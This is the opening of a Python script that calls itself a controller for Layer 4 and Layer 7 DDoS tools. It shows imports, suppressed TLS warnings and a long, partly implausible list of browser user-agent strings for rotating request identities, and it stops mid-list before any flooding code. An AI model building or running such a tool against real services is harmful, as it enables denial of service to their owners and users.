#!/usr/bin/env python3
"""
Network Toolkit Controller
Controls Layer 4 and Layer 7 tools with ethical DDOS testing.
Educational purposes only - use on your own systems.
"""

import warnings
warnings.filterwarnings('ignore', category=FutureWarning)
warnings.filterwarnings('ignore', category=DeprecationWarning)
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

import os
import sys
import subprocess
import time
import threading
import random
from datetime import datetime
import itertools

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/120 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:121) Gecko/20100101 Firefox/121",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/120 Safari/537",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605 (KHTML, like Gecko) Version/17 Safari/605",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/120 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/119 Safari/537 Edg/119",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17 like Mac OS X) AppleWebKit/605 (KHTML, like Gecko) Version/17 Mobile/15E148 Safari/604",
    "Mozilla/5.0 (iPad; CPU OS 17 like Mac OS X) AppleWebKit/605 (KHTML, like Gecko) Version/17 Mobile/15E148 Safari/604",
    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/118 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:120) Gecko/20100101 Firefox/120",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/119 Safari/537",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605 (KHTML, like Gecko) Version/16 Safari/605",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/119 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/117 Safari/537 Edg/117",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16 like Mac OS X) AppleWebKit/605 (KHTML, like Gecko) Version/16 Mobile/15E148 Safari/604",
    "Mozilla/5.0 (iPad; CPU OS 16 like Mac OS X) AppleWebKit/605 (KHTML, like Gecko) Version/16 Mobile/15E148 Safari/604",
    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/116 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:119) Gecko/20100101 Firefox/119",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/118 Safari/537",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605 (KHTML, like Gecko) Version/15 Safari/605",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/118 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/115 Safari/537 Edg/115",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 15 like Mac OS X) AppleWebKit/605 (KHTML, like Gecko) Version/15 Mobile/15E148 Safari/604",
    "Mozilla/5.0 (iPad; CPU OS 15 like Mac OS X) AppleWebKit/605 (KHTML, like Gecko) Version/15 Mobile/15E148 Safari/604",
    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/114 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:118) Gecko/20100101 Firefox/118",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/117 Safari/537",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605 (KHTML, like Gecko) Version/14 Safari/605",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/117 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/113 Safari/537 Edg/113",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14 like Mac OS X) AppleWebKit/605 (KHTML, like Gecko) Version/14 Mobile/15E148 Safari/604",
    "Mozilla/5.0 (iPad; CPU OS 14 like Mac OS X) AppleWebKit/605 (KHTML, like Gecko) Version/14 Mobile/15E148 Safari/604",
    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/112 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:117) Gecko/20100101 Firefox/117",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/116 Safari/537",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605 (KHTML, like Gecko) Version/13 Safari/605",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/116 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/111 Safari/537 Edg/111",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 13 like Mac OS X) AppleWebKit/605 (KHTML, like Gecko) Version/13 Mobile/15E148 Safari/604",
    "Mozilla/5.0 (iPad; CPU OS 13 like Mac OS X) AppleWebKit/605 (KHTML, like Gecko) Version/13 Mobile/15E148 Safari/604",
    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/110 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:116) Gecko/20100101 Firefox/116",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/115 Safari/537",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605 (KHTML, like Gecko) Version/12 Safari/605",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/115 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/109 Safari/537 Edg/109",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 12 like Mac OS X) AppleWebKit/605 (KHTML, like Gecko) Version/12 Mobile/15E148 Safari/604",
    "Mozilla/5.0 (iPad; CPU OS 12 like Mac OS X) AppleWebKit/605 (KHTML, like Gecko) Version/12 Mobile/15E148 Safari/604",
    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/108 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:115) Gecko/20100101 Firefox/115",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/114 Safari/537",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605 (KHTML, like Gecko) Version/11 Safari/605",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/114 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/107 Safari/537 Edg/107",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 11 like Mac OS X) AppleWebKit/605 (KHTML, like Gecko) Version/11 Mobile/15E148 Safari/604",
    "Mozilla/5.0 (iPad; CPU OS 11 like Mac OS X) AppleWebKit/605 (KHTML, like Gecko) Version/11 Mobile/15E148 Safari/604",
    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/106 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:114) Gecko/20100101 Firefox/114",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/113 Safari/537",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605 (KHTML, like Gecko) Version/10 Safari/605",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/113 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/105 Safari/537 Edg/105",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 10 like Mac OS X) AppleWebKit/605 (KHTML, like Gecko) Version/10 Mobile/15E148 Safari/604",
    "Mozilla/5.0 (iPad; CPU OS 10 like Mac OS X) AppleWebKit/605 (KHTML, like Gecko) Version/10 Mobile/15E148 Safari/604",
    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/104 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:113) Gecko/20100101 Firefox/113",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/112 Safari/537",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605 (KHTML, like Gecko) Version/9 Safari/605",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/112 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/103 Safari/537 Edg/103",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 9 like Mac OS X) AppleWebKit/605 (KHTML, like Gecko) Version/9 Mobile/15E148 Safari/604",
    "Mozilla/5.0 (iPad; CPU OS 9 like Mac OS X) AppleWebKit/605 (KHTML, like Gecko) Version/9 Mobile/15E148 Safari/604",
    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/102 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:112) Gecko/20100101 Firefox/112",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/111 Safari/537",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605 (KHTML, like Gecko) Version/8 Safari/605",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/111 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/101 Safari/537 Edg/101",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 8 like Mac OS X) AppleWebKit/605 (KHTML, like Gecko) Version/8 Mobile/15E148 Safari/604",
    "Mozilla/5.0 (iPad; CPU OS 8 like Mac OS X) AppleWebKit/605 (KHTML, like Gecko) Version/8 Mobile/15E148 Safari/604",
    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/100 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:111) Gecko/20100101 Firefox/111",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/110 Safari/537",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605 (KHTML, like Gecko) Version/7 Safari/605",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/110 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/99 Safari/537 Edg/99",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 7 like Mac OS X) AppleWebKit/605 (KHTML, like Gecko) Version/7 Mobile/15E148 Safari/604",
    "Mozilla/5.0 (iPad; CPU OS 7 like Mac OS X) AppleWebKit/605 (KHTML, like Gecko) Version/7 Mobile/15E148 Safari/604",
    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/98 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:110) Gecko/20100101 Firefox/110",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/109 Safari/537",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605 (KHTML, like Gecko) Version/6 Safari/605",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/109 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/97 Safari/537 Edg/97",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 6 like Mac OS X) AppleWebKit/605 (KHTML, like Gecko) Version/6 Mobile/15E148 Safari/604",
    "Mozilla/5.0 (iPad; CPU OS 6 like Mac OS X) AppleWebKit/605 (KHTML, like Gecko) Version/6 Mobile/15E148 Safari/604",
    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/96 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:109) Gecko/20100101 Firefox/109",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/108 Safari/537",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605 (KHTML, like Gecko) Version/5 Safari/605",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/108 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/95 Safari/537 Edg/95",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 5 like Mac OS X) AppleWebKit/605 (KHTML, like Gecko) Version/5 Mobile/15E148 Safari/604",
    "Mozilla/5.0 (iPad; CPU OS 5 like Mac OS X) AppleWebKit/605 (KHTML, like Gecko) Version/5 Mobile/15E148 Safari/604",
    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/94 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:108) Gecko/20100101 Firefox/108",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/107 Safari/537",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605 (KHTML, like Gecko) Version/4 Safari/605",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/107 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/93 Safari/537 Edg/93",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 4 like Mac OS X) AppleWebKit/605 (KHTML, like Gecko) Version/4 Mobile/15E148 Safari/604",
    "Mozilla/5.0 (iPad; CPU OS 4 like Mac OS X) AppleWebKit/605 (KHTML, like Gecko) Version/4 Mobile/15E148 Safari/604",
    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/92 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:107) Gecko/20100101 Firefox/107",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/106 Safari/537",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605 (KHTML, like Gecko) Version/3 Safari/605",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/106 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/91 Safari/537 Edg/91",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 3 like Mac OS X) AppleWebKit/605 (KHTML, like Gecko) Version/3 Mobile/15E148 Safari/604",
    "Mozilla/5.0 (iPad; CPU OS 3 like Mac OS X) AppleWebKit/605 (KHTML, like Gecko) Version/3 Mobile/15E148 Safari/604",
    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/90 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:106) Gecko/20100101 Firefox/106",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/105 Safari/537",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605 (KHTML, like Gecko) Version/2 Safari/605",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/105 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/89 Safari/537 Edg/89",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 2 like Mac OS X) AppleWebKit/605 (KHTML, like Gecko) Version/2 Mobile/15E148 Safari/604",
    "Mozilla/5.0 (iPad; CPU OS 2 like Mac OS X) AppleWebKit/605 (KHTML, like Gecko) Version/2 Mobile/15E148 Safari/604",
    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/88 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:105) Gecko/20100101 Firefox/105",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/104 Safari/537",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605 (KHTML, like Gecko) Version/1 Safari/605",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/104 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/87 Safari/537 Edg/87",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 1 like Mac OS X) AppleWebKit/605 (KHTML, like Gecko) Version/1 Mobile/15E148 Safari/604",
    "Mozilla/5.0 (iPad; CPU OS 1 like Mac OS X) AppleWebKit/605 (KHTML, like Gecko) Version/1 Mobile/15E148 Safari/604",
    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/86 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:104) Gecko/20100101 Firefox/104",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/103 Safari/537",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/103 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/85 Safari/537 Edg/85",
    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/84 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:103) Gecko/20100101 Firefox/103",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/102 Safari/537",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/102 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/83 Safari/537 Edg/83",
    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/82 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:102) Gecko/20100101 Firefox/102",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/101 Safari/537",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/101 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/81 Safari/537 Edg/81",
    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/80 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:101) Gecko/20100101 Firefox/101",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/100 Safari/537",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/100 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/79 Safari/537 Edg/79",
    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/78 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:100) Gecko/20100101 Firefox/100",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/99 Safari/537",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/99 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/77 Safari/537 Edg/77",
    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/76 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:99) Gecko/20100101 Firefox/99",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/98 Safari/537",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/98 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/75 Safari/537 Edg/75",
    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/74 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:98) Gecko/20100101 Firefox/98",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/97 Safari/537",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/97 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/73 Safari/537 Edg/73",
    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/72 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:97) Gecko/20100101 Firefox/97",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/96 Safari/537",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/96 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/71 Safari/537 Edg/71",
    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/70 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:96) Gecko/20100101 Firefox/96",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/95 Safari/537",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/95 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/69 Safari/537 Edg/69",
    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/68 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:95) Gecko/20100101 Firefox/95",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/94 Safari/537",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/94 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/67 Safari/537 Edg/67",
    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/66 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:94) Gecko/20100101 Firefox/94",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/93 Safari/537",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/93 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/65 Safari/537 Edg/65",
    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/64 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:93) Gecko/20100101 Firefox/93",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/92 Safari/537",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/92 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/63 Safari/537 Edg/63",
    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/62 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:92) Gecko/20100101 Firefox/92",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/91 Safari/537",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/91 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/61 Safari/537 Edg/61",
    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/60 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:91) Gecko/20100101 Firefox/91",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/90 Safari/537",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/90 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/59 Safari/537 Edg/59",
    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/58 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:90) Gecko/20100101 Firefox/90",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/89 Safari/537",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/89 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/57 Safari/537 Edg/57",
    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/56 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:89) Gecko/20100101 Firefox/89",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/88 Safari/537",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/88 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/55 Safari/537 Edg/55",
    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/54 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:88) Gecko/20100101 Firefox/88",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/87 Safari/537",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537 (KHTML, like Gecko) Chrome/87 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/53 Safari/537 Edg/53",
    "Mozilla/5.0 (Windows NT 10; Win64; x64) AppleWebKit/537 (KHTML, like Gecko) Chrome/52 Safari/537",
    "Mozilla/5.0 (Windows NT 10; Win64; x64; rv:87) Gecko/20100101 Firefox/87",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537 (KHTML, like Gecko) Chrome/86 Safari/537",
